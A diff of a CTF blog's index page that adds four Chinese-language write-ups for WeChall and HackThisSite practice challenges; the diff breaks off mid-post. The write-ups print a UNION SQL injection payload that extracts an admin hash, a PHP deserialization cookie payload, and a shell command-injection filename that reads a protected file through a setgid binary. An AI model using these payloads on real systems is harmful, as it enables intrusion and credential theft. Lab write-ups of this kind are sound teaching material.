@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">341</span>
+          <span class="site-state-item-count">345</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -246,7 +246,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">210</span>
+        <span class="site-state-item-count">211</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -376,6 +376,572 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-md5-salt/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-md5-salt/" class="post-title-link" itemprop="url">WeChall - MD5.SALT</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-10 10:55:57 / Modified: 11:04:48" itemprop="dateCreated datePublished" datetime="2026-06-10T10:55:57+08:00">2026-06-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-md5-salt/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-md5-salt/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Your mission is to login as Admin. The application is vulnerable to
+sql injection, but the signup process seems a bit "weird". 目标是以
+admin 身份登录。用户名字段存在 SQL 注入漏洞。</p>
+</blockquote>
+<p>题目给出了 users 表结构（<code>username</code>、<code>password</code>
+两列）。登录表单同时兼具注册功能——输入新用户名和密码即可注册。</p>
+<p>表单字段名为 <code>username</code> 和
+<code>credents</code>。密码的存储方式为
+<code>md5($password . 'salt21')</code>——即 MD5 后接固定盐值
+<code>salt21</code>。</p>
+<h3 id="solution">Solution</h3>
+<p><strong>Step 1: 提取 admin 的密码 hash</strong></p>
+<p>通过 UNION 注入读取 admin 的 password 字段：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="string">&#x27; UNION SELECT CONCAT(username,0x3a,password),1 FROM users WHERE username=&#x27;</span>admin<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
+<p>返回结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello Admin:215c61d0104f8925b5f7e4e87a7cbdfa... checking your credentials...</span><br></pre></td></tr></table></figure>
+<p>admin 的密码 hash 为
+<code>215c61d0104f8925b5f7e4e87a7cbdfa</code>。</p>
+<p><strong>Step 2: 确定 hash 算法</strong></p>
+<p>注册一个新用户，用 UNION 提取其 hash，与各种算法比对：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册新用户 extractnqwozrfv 密码 password1</span></span><br><span class="line"><span class="comment"># 提取其 hash</span></span><br><span class="line">$ username=<span class="string">&#x27; UNION SELECT CONCAT(username,0x3a,password),1 FROM users WHERE username=&#x27;</span>extractnqwozrfv<span class="string">&#x27; -- &#x27;</span></span><br><span class="line">Hello extractnqwozrfv:bd4db6aa036b085e72f546130e5007b7</span><br></pre></td></tr></table></figure>
+<p>比对算法后发现：<code>md5('password1' . 'salt21')</code> =
+<code>bd4db6aa036b085e72f546130e5007b7</code></p>
+<p><strong>Step 3: 破解 admin 的 hash</strong></p>
+<p>拿到 <code>215c61d0104f8925b5f7e4e87a7cbdfa</code> 后，需要用 MD5
+反查得到明文。这里是本题最核心的一步——<strong>在线 MD5
+反查服务</strong>。</p>
+<p>尝试了多个在线 hash 反查网站：</p>
+<ul>
+<li>cmd5.com / xmd5.com — 需要付费</li>
+<li>pmd5.com — 解不出</li>
+<li><strong>somd5.com</strong> — 成功解出，返回明文
+<code>academicsalt21</code></li>
+</ul>
+<blockquote>
+<p>注意：hashcat / john 等本地工具也可以做，但对于这种简单单词 +
+固定后缀的模式，用彩虹表/在线反查更快。关键在于 hash 的构造方式是
+<code>md5(明文密码 + 'salt21')</code>，所以反查工具返回的原始输入是
+<code>密码 + salt21</code> 整体。</p>
+</blockquote>
+<p><strong>Step 4: 去掉盐值得到真正密码</strong></p>
+<p>somd5 返回的明文是
+<code>academicsalt21</code>。这里有个坑——直接拿这个值登录会失败。</p>
+<p>题目的名字 <strong>MD5.SALT</strong> 是关键提示：salt 是拼接在 hash
+计算过程中的，不是密码的一部分。所以：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">&#x27;academic&#x27;</span> + <span class="string">&#x27;salt21&#x27;</span>) = md5(<span class="string">&#x27;academicsalt21&#x27;</span>) = 215c61d0104f8925b5f7e4e87a7cbdfa</span><br></pre></td></tr></table></figure>
+<p>真正的密码是 <code>academic</code>，去掉末尾的
+<code>salt21</code>。</p>
+<p><strong>Step 5: 登录</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">credents: academic</span><br></pre></td></tr></table></figure>
+<p>登录成功，<code>/en/challs</code> 中该题显示为
+<code>wc_chall_solved_1</code>。</p>
+<p><strong>关键的 SQL 注入点</strong></p>
+<p>LOGIN 功能的 SQL 查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>该查询结果用于获取用户名和密码 hash，然后 PHP 做密码对比：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">queryFirst</span>(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="variable">$input_hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span> . <span class="string">&#x27;salt21&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$input_hash</span>) &#123;</span><br><span class="line">        <span class="comment">// login success</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注册功能的 INSERT 也使用了相同的 hash 算法，所以注册和登录一致。</p>
+<p><strong>关于 "weird signup"</strong></p>
+<p>挑战描述提到注册过程 "a bit
+weird"。检查源码发现，在注册时会校验你输入的密码是否和你真实的 WeChall
+账号密码一致——如果是，会拒绝注册（<code>err_fool</code>：不允许在这里使用你的真实
+WeChall 密码）。但这不影响解题。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">academic</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-11/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/HackThisSite/hackthissite-basic-11/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 11</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-09 20:55:39 / Modified: 20:55:40" itemprop="dateCreated datePublished" datetime="2026-06-09T20:55:39+08:00">2026-06-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-11/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-11/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Sam decided to make a music site. Unfortunately he does not
+understand Apache.</p>
+<p>Sam 决定做一个音乐网站，可惜他不懂 Apache 配置。</p>
+</blockquote>
+<p>页面上随机显示一句歌词，如
+<code>"Ghetto Gospel" is the best!</code>，每次刷新会变。没有密码输入框，没有明显的交互元素。</p>
+<h3 id="solution">Solution</h3>
+<p>这题考察的是 Apache 服务器配置知识，解题过程像一个探索任务。</p>
+<h4 id="step-1-识别歌曲线索">Step 1 — 识别歌曲线索</h4>
+<p>多次刷新页面，歌曲会变化，包括：</p>
+<ul>
+<li>"Ghetto Gospel" (2Pac ft. Elton John)</li>
+<li>"Georgia" (Elton John)</li>
+<li>等等</li>
+</ul>
+<p>搜索这些歌曲，全部是 <strong>Elton John</strong>
+的作品。这暗示了目录结构。</p>
+<h4 id="step-2-目录遍历">Step 2 — 目录遍历</h4>
+<p>尝试拼出 Elton 的名字：访问
+<code>/missions/basic/11/e/</code>，发现目录列表！继续往下走：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/missions/basic/11/e/</span><br><span class="line">/missions/basic/11/e/l/</span><br><span class="line">/missions/basic/11/e/l/t/</span><br><span class="line">/missions/basic/11/e/l/t/o/</span><br><span class="line">/missions/basic/11/e/l/t/o/n/    ← 最后一层，看起来是空的</span><br></pre></td></tr></table></figure>
+<h4 id="step-3-查看-.htaccess-文件">Step 3 — 查看 .htaccess 文件</h4>
+<p><code>/e/l/t/o/n/</code> 目录看起来是空的，但在 Apache
+中，<code>.htaccess</code> 文件可能被目录列表隐藏了。直接访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/.htaccess</span><br></pre></td></tr></table></figure>
+<p>内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IndexIgnore DaAnswer.* .htaccess</span><br><span class="line"></span><br><span class="line">&lt;Files .htaccess&gt;</span><br><span class="line">require all granted</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>IndexIgnore</code>：告诉 Apache 目录列表中不要显示
+<code>DaAnswer.*</code> 和 <code>.htaccess</code></li>
+<li><code>&lt;Files .htaccess&gt;</code>：允许所有人访问
+<code>.htaccess</code>（这是关键错误，应该禁止访问）</li>
+</ul>
+<h4 id="step-4-访问-daanswer">Step 4 — 访问 DaAnswer</h4>
+<p>既然 <code>.htaccess</code> 泄露了隐藏的文件名，直接访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/DaAnswer</span><br></pre></td></tr></table></figure>
+<p>页面显示动态文本，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The answer is available!</span><br><span class="line">Just look a little harder.</span><br></pre></td></tr></table></figure>
+<h4 id="step-5-提交答案">Step 5 — 提交答案</h4>
+<p>访问
+<code>/missions/basic/11/index.php</code>（注意不是入口页面），会出现密码输入框。表单字段名是
+<code>answer</code>，提交 <code>available</code> 即可过关。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -b <span class="string">&#x27;HackThisSite=YOUR_COOKIE&#x27;</span> \</span><br><span class="line">    -e <span class="string">&#x27;https://www.hackthissite.org/missions/basic/11/index.php&#x27;</span> \</span><br><span class="line">    --data-urlencode <span class="string">&#x27;answer=available&#x27;</span> \</span><br><span class="line">    <span class="string">&#x27;https://www.hackthissite.org/missions/basic/11/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>核心知识点：</p>
+<ol type="1">
+<li>Apache 的 <code>IndexIgnore</code>
+只是不在目录列表中显示文件，文件本身仍然可以被直接访问</li>
+<li><code>.htaccess</code>
+文件应该禁止外部访问（<code>Require all denied</code>），否则会泄露目录配置信息</li>
+<li>路径遍历 + 配置文件泄露是经典的 Apache 安全问题</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-are-you-serial/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-are-you-serial/" class="post-title-link" itemprop="url">WeChall - Are you serial</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-09 17:36:27 / Modified: 17:38:42" itemprop="dateCreated datePublished" datetime="2026-06-09T17:36:27+08:00">2026-06-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-are-you-serial/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-are-you-serial/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>PHP 反序列化漏洞。页面显示多个源码文件，需要通过操控
+<code>serial_user</code> cookie 触发
+<code>SERIAL_Solution::__wakeup()</code> 调用
+<code>onChallengeSolved()</code>。</p>
+<h3 id="solution">Solution</h3>
+<p>源码结构:</p>
+<ul>
+<li><code>code.php</code>: 读取 <code>serial_user</code> cookie，调用
+<code>unserialize()</code>，然后用结果调用
+<code>getUsername()</code>/<code>getPassword()</code>/<code>getUserlevel()</code></li>
+<li><code>SERIAL_Solution.php</code>: <code>__wakeup()</code> 方法调用
+<code>onChallengeSolved()</code></li>
+<li><code>SERIAL_User.php</code>: 包含 <code>username</code>,
+<code>password</code>, <code>userlevel</code> 属性</li>
+</ul>
+<p>核心漏洞: <code>unserialize()</code> 会实例化 cookie
+中指定的类。如果反序列化 <code>SERIAL_Solution</code>
+对象，<code>__wakeup()</code> 会自动触发。</p>
+<p>Payload (设置为 <code>serial_user</code> cookie):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:16:&quot;SERIAL_Solution&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>使用 curl 提交:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;WC=&lt;session&gt;; serial_user=O%3A16%3A%22SERIAL_Solution%22%3A0%3A%7B%7D&#x27;</span> \</span><br><span class="line">    <span class="string">&#x27;https://www.wechall.net/en/challenge/are_you_serial/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>注意: <code>__wakeup()</code> 触发后，代码继续调用
+<code>getUsername()</code> 等方法可能导致 fatal error。如果 curl
+不生效，尝试通过浏览器 cookie 注入。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-choose-your-path/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-choose-your-path/" class="post-title-link" itemprop="url">WeChall - Choose your Path</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-09 17:35:46 / Modified: 17:35:48" itemprop="dateCreated datePublished" datetime="2026-06-09T17:35:46+08:00">2026-06-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-choose-your-path/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-choose-your-path/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>This is the level10 mini challenge found in
+<code>/home/level/10/</code> on the warchall box. You can view the
+source here. 这是 Warchall 服务器上的 Level 10 小挑战，目录在
+<code>/home/level/10/</code>（当前服务器实际目录名为
+<code>/home/level/10_choose_your_path/</code>），题目页面给出了源码。</p>
+</blockquote>
+<p>题目程序 <code>charp</code>
+会统计一个文件的平均每行字符数。源码核心逻辑如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 256</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">  <span class="type">char</span> *filename;</span><br><span class="line">  <span class="type">int</span> lines, chars, cpl;</span><br><span class="line"></span><br><span class="line">  setregid(<span class="number">510</span>,<span class="number">510</span>); <span class="comment">// set real and effective GID to level10</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s filename\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  filename = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">snprintf</span>(buf, BUFSIZE, <span class="string">&quot;/usr/bin/wc -l %s&quot;</span>, filename) &gt;= BUFSIZE) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Filename %s is too long!\n&quot;</span>, filename);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fp = popen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d&quot;</span>, &amp;lines);</span><br><span class="line">  pclose(fp);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, BUFSIZE, <span class="string">&quot;/usr/bin/wc -c %s&quot;</span>, filename);</span><br><span class="line">  fp = popen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d&quot;</span>, &amp;chars);</span><br><span class="line">  pclose(fp);</span><br><span class="line"></span><br><span class="line">  cpl = chars / lines;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Chars per line is %d.\n&quot;</span>, cpl);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>目录里有两个关键文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -la /home/level/10_choose_your_path/</span><br><span class="line">-rwxr-sr-x  1 level10 level10 16392 Jan  3  2023 charp</span><br><span class="line">-rw-r--r--  1 root    level10  1303 Jan  3  2023 charp.c</span><br><span class="line">-rw-rw----  1 root    level10   171 Jan  3  2023 solution.txt</span><br></pre></td></tr></table></figure>
+<p><code>solution.txt</code> 对普通用户不可读，但 <code>charp</code> 有
+setgid bit：执行时有效 group 变成
+<code>level10</code>，所以它能读这个文件。</p>
+<h3 id="solution">Solution</h3>
+<p>关键约束：</p>
+<ul>
+<li>程序确实用绝对路径 <code>/usr/bin/wc</code>，所以不能通过
+<code>PATH</code> 劫持 <code>wc</code>。</li>
+<li>但它把用户输入的 <code>filename</code> 直接拼进 shell 命令，再交给
+<code>popen()</code> 执行。</li>
+<li><code>popen()</code> 等价于让 <code>/bin/sh -c</code>
+执行字符串，因此 <code>;</code>, <code>|</code>, <code>#</code>,
+redirection 都会被 shell 解析。</li>
+</ul>
+<p>也就是说，这不是文件路径选择问题，而是 command injection。</p>
+<p>程序第一次执行的命令形如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/wc -l &lt;filename&gt;</span><br></pre></td></tr></table></figure>
+<p>如果我们把 <code>&lt;filename&gt;</code> 传成：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solution.txt 1&gt;&amp;2; /bin/cat solution.txt 1&gt;&amp;2; #</span><br></pre></td></tr></table></figure>
+<p>实际命令会变成：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/wc -l solution.txt 1&gt;&amp;2; /bin/cat solution.txt 1&gt;&amp;2; <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<ul>
+<li><code>solution.txt</code> 作为正常参数，让 <code>wc</code>
+不至于立刻失败。</li>
+<li><code>1&gt;&amp;2</code> 把 stdout 重定向到
+stderr。<code>charp</code> 会从 <code>popen()</code> 的 stdout
+里读取数字；如果把注入命令的输出留在 stdout，可能干扰
+<code>fscanf()</code>。</li>
+<li><code>; /bin/cat solution.txt 1&gt;&amp;2</code> 追加执行
+<code>cat</code>，借助 setgid 权限读取答案，并输出到 stderr。</li>
+<li><code>#</code> 注释掉后面可能拼接出的残余命令片段。</li>
+</ul>
+<p>Live 验证命令：</p>
